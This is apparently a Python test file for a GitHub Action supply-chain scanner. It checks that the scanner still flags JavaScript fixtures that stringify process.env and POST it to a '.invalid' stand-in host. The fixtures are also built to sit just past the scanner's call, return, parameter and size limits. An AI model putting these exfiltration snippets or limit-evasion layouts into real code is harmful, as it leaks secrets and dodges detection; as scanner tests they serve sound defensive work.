"""FP-GITHUB-SCRIPT (0.1.9), the review of Oct 18, HIGH 2 and 3 (test_fp_github_script_review.py holds HIGH 1): the
narrowing lost real sends the reading before it found at the follower's limits.

2. The 100 returns the follower reads: a function returning the environment after 100 others lost its callers.
3. The 200 calls and the 200 functions' parameters it reads: the call that gives the environment, or the function it
   is given to, past them was lost.

A reading that narrowed a name and met any of the follower's limits now reads the text as before too, and reports
what that reading finds (the narrowing one's when it finds nothing). Each case is checked through the text follower,
short and long, and the last case within each limit and the first past it through the action scan past the
supply-chain tree's limit.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.registry import repo
from lazaret.scanner import core
from tests.registry import _actions_support as fx

WHOLE = ("environment", "the whole environment", False)
HARVEST = "reads credentials or the whole environment and sends data over the network"
ACTION_YML = "name: x\nruns:\n  using: node24\n  main: dist/index.js\n"
CRITICAL = [("CRITICAL", "dist/index.js runs when the action runs (runs.main), and it " + HARVEST + ".")]
# statements past which a text is longer than _LD_LONG and meets none of the follower's limits; a comment that takes
# it past the tree's limit
PLAIN = "\n" + "void 0;\n" * 40000
PAST = "/*" + " pad" * 520000 + "*/\n"


def returns_case(n):
    # a function returns the environment after n others' returns (_DD_MAX_CALLS: 100 are read)
    return ("".join("function unused%d(){return 0;}\n" % k for k in range(n))
            + "function collect(){const d=JSON.stringify(process.env);return d;}\n"
            "function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\nsend(collect());\n")


def calls_case(n):
    # the call that gives it after n others (_LD_MAX: 200 calls of the script's functions are read, the definitions'
    # among them)
    return ("function noop(x){}\nfunction collect(){const d=JSON.stringify(process.env);return d;}\n"
            "function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\n"
            + "noop(0);\n" * n + "send(collect());\n")


def params_case(n):
    # the function it is given to after n others with parameters (_LD_MAX: 200 are kept)
    return ("function collect(){const d=JSON.stringify(process.env);return d;}\nsend(collect());\n"
            + "".join("function unused%d(x){void x;}\n" % k for k in range(n))
            + "function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\n")


def sent(text):
    got = core.local_data_sent_at(text)
    return None if got is None else tuple(got[1:])


def action_risks(js):
    res = repo.scan_action(fx.archive("o/r", "0" * 40, {"action.yml": ACTION_YML, "dist/index.js": js}), "")
    return [(i["sev"], i["msg"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]


class LimitTests(unittest.TestCase):
    CASES = ([("returns", n, returns_case(n)) for n in (0, 98, 99, 100, 101, 200)]
             + [("calls", n, calls_case(n)) for n in (0, 190, 196, 197, 198, 199, 200, 201)]
             + [("parameters", n, params_case(n)) for n in (198, 199, 200, 201)])

    def test_the_follower_finds_it_at_and_past_each_limit(self):
        for what, n, text in self.CASES:
            with self.subTest(what, n=n):
                self.assertEqual(sent(text), WHOLE)
                self.assertEqual(sent(text + PLAIN), WHOLE)

    def test_through_the_action_scan_past_the_trees_limit(self):
        # each limit's last case within it and first past it
        for what, n, text in self.CASES:
            if (what, n) in {("returns", 99), ("returns", 100), ("calls", 197), ("calls", 198), ("parameters", 199),
                             ("parameters", 200)}:
                with self.subTest(what, n=n):
                    self.assertEqual(action_risks(text + PAST), CRITICAL)


if __name__ == "__main__":
    unittest.main()
